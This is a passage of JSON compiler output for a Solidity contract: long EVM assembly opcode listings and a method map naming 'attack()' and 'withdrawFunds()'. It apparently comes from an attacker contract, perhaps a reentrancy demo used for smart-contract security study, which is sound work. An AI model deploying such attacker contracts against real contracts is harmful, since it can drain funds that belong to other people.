											"end": 209,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "22"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "22"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7449,
											"end": 7465,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7470,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7449,
											"end": 7470,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "PUSH",
											"source": 0,
											"value": "C879657200000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"source": -1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7471,
											"end": 7511,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "23"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "25"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "23"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "25"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "28"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "27"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "28"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "27"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7449,
											"end": 7512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc",
							"withdrawFunds()": "24600fc3"
						}
					},
